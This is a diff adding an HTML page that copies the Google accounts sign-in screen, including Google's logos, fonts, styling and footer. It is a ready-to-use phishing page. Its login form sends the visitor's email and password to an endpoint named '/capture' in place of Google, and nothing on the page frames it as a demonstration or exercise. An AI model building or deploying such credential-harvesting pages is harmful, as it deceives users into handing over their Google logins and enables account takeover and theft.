@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sign in – Google accounts</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{
+    background:#fff;
+    font-family:'Google Sans','Roboto',Arial,sans-serif;
+    display:flex;flex-direction:column;
+    align-items:center;justify-content:space-between;
+    min-height:100vh;padding:28px 0 16px
+  }
+  .top-logo{align-self:flex-start;padding:0 28px}
+  .top-logo svg{height:24px}
+  .center{flex:1;display:flex;align-items:center;justify-content:center;width:100%;padding:0 16px}
+  .card{
+    border:1px solid #dadce0;border-radius:8px;
+    padding:48px 40px 36px;width:450px;max-width:100%
+  }
+  .g-logo{text-align:center;margin-bottom:16px}
+  .g-logo svg{height:24px}
+  h1{
+    text-align:center;font-size:1.5rem;font-weight:400;
+    color:#202124;margin-bottom:8px;letter-spacing:-.5px
+  }
+  .sub{
+    text-align:center;color:#5f6368;font-size:.875rem;
+    font-family:'Roboto',sans-serif;margin-bottom:32px
+  }
+  .sub a{color:#1a73e8;text-decoration:none}
+  .sub a:hover{text-decoration:underline}
+
+  /* floating label field */
+  .field{position:relative;margin-bottom:24px}
+  .field input{
+    width:100%;
+    border:1px solid #747775;border-radius:4px;
+    padding:13px 16px 13px;
+    font-size:1rem;font-family:'Roboto',sans-serif;
+    outline:none;color:#202124;background:transparent;
+    transition:border-color .2s;
+  }
+  .field input:focus{border-color:#1a73e8;border-width:2px;padding:12px 15px 12px}
+  .field label{
+    position:absolute;left:12px;top:50%;transform:translateY(-50%);
+    font-size:1rem;font-family:'Roboto',sans-serif;color:#444746;
+    background:#fff;padding:0 4px;pointer-events:none;
+    transition:all .15s cubic-bezier(.4,0,.2,1);
+    transform-origin:left center;
+  }
+  .field input:focus ~ label,
+  .field input:not(:placeholder-shown) ~ label{
+    top:0;font-size:.75rem;color:#1a73e8;
+    transform:translateY(-50%) scale(1)
+  }
+  .field input::placeholder{color:transparent}
+
+  /* password field with show button */
+  .pw-field{position:relative;margin-bottom:8px}
+  .pw-field input{
+    width:100%;
+    border:1px solid #747775;border-radius:4px;
+    padding:13px 48px 13px 16px;
+    font-size:1rem;font-family:'Roboto',sans-serif;
+    outline:none;color:#202124;background:transparent;
+    transition:border-color .2s;
+  }
+  .pw-field input:focus{border-color:#1a73e8;border-width:2px;padding:12px 47px 12px 15px}
+  .pw-field label{
+    position:absolute;left:12px;top:50%;transform:translateY(-50%);
+    font-size:1rem;font-family:'Roboto',sans-serif;color:#444746;
+    background:#fff;padding:0 4px;pointer-events:none;
+    transition:all .15s cubic-bezier(.4,0,.2,1);
+  }
+  .pw-field input:focus ~ label,
+  .pw-field input:not(:placeholder-shown) ~ label{
+    top:0;font-size:.75rem;color:#1a73e8;transform:translateY(-50%)
+  }
+  .pw-field input::placeholder{color:transparent}
+  .show-pw{
+    position:absolute;right:12px;top:50%;transform:translateY(-50%);
+    font-size:.875rem;font-weight:500;color:#1a73e8;
+    cursor:pointer;user-select:none;font-family:'Google Sans',sans-serif;
+    border:none;background:none;padding:4px
+  }
+
+  .forgot-row{margin-bottom:28px}
+  .forgot-row a{
+    font-size:.875rem;color:#1a73e8;text-decoration:none;
+    font-family:'Google Sans',sans-serif;font-weight:500
+  }
+  .forgot-row a:hover{text-decoration:underline}
+
+  .actions{
+    display:flex;justify-content:space-between;align-items:center;margin-top:8px
+  }
+  .create-link{
+    font-size:.875rem;color:#1a73e8;text-decoration:none;
+    font-family:'Google Sans',sans-serif;font-weight:500
+  }
+  .create-link:hover{text-decoration:underline}
+  .btn{
+    background:#1a73e8;color:#fff;border:none;border-radius:4px;
+    padding:0 24px;height:36px;font-size:.875rem;font-weight:500;
+    font-family:'Google Sans',sans-serif;cursor:pointer;
+    letter-spacing:.0107142857rem;
+    transition:box-shadow .15s,background .15s
+  }
+  .btn:hover{
+    background:#1765cc;
+    box-shadow:0 1px 3px 1px rgba(66,133,244,.15),0 1px 2px rgba(66,133,244,.3)
+  }
+  .btn:active{background:#0d5cbf}
+
+  footer{
+    display:flex;justify-content:space-between;align-items:center;
+    width:100%;padding:0 24px;font-size:.75rem;color:#5f6368;
+    font-family:'Roboto',sans-serif
+  }
+  footer a{color:#5f6368;text-decoration:none;margin:0 8px}
+  footer a:hover{text-decoration:underline}
+  .lang-btn{
+    display:flex;align-items:center;gap:4px;border:none;background:none;
+    color:#5f6368;font-size:.75rem;cursor:pointer;padding:8px;
+    font-family:'Roboto',sans-serif
+  }
+</style>
+</head>
+<body>
+<div class="top-logo">
+  <svg viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg" aria-label="Google">
+    <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335"/>
+    <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#FBBC05"/>
+    <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#4285F4"/>
+    <path d="M225 3v65h-9.5V3h9.5z" fill="#34A853"/>
+    <path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.70-8.23-4.70-4.95 0-11.84 4.37-11.59 12.93z" fill="#EA4335"/>
+    <path d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65H35.29z" fill="#4285F4"/>
+  </svg>
+</div>
+
+<div class="center">
+  <div class="card">
+    <div class="g-logo">
+      <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" height="48">
+        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+        <path fill="none" d="M0 0h48v48H0z"/>
+      </svg>
+    </div>
+    <h1>Sign in</h1>
+    <p class="sub">to continue to <a href="#">Google</a></p>
+    <form method="POST" action="/capture" autocomplete="on">
+      <div class="field">
+        <input name="email" id="email" type="email" placeholder=" " required autocomplete="username">
+        <label for="email">Email or phone</label>
+      </div>
+      <div class="pw-field">
+        <input name="password" id="pw" type="password" placeholder=" " required autocomplete="current-password">
+        <label for="pw">Enter your password</label>
+        <button type="button" class="show-pw" tabindex="-1"
+          onclick="var i=document.getElementById('pw');i.type=i.type==='password'?'text':'password';this.textContent=i.type==='password'?'Show':'Hide'">Show</button>
+      </div>
+      <div class="forgot-row">
+        <a href="#">Forgot password?</a>
+      </div>
+      <div class="actions">
+        <a href="https://accounts.google.com/signup" class="create-link" tabindex="-1">Create account</a>
+        <button class="btn" type="submit">Next</button>
+      </div>
+    </form>
+  </div>
+</div>
+
+<footer>
+  <button class="lang-btn" tabindex="-1">
+    <svg height="16" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
+    English (United States)
+    <svg height="16" viewBox="0 0 24 24" fill="#5f6368"><path d="M7 10l5 5 5-5z"/></svg>
+  </button>
+  <div>
+    <a href="#">Help</a>
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+  </div>
+</footer>
+</body>
+</html>
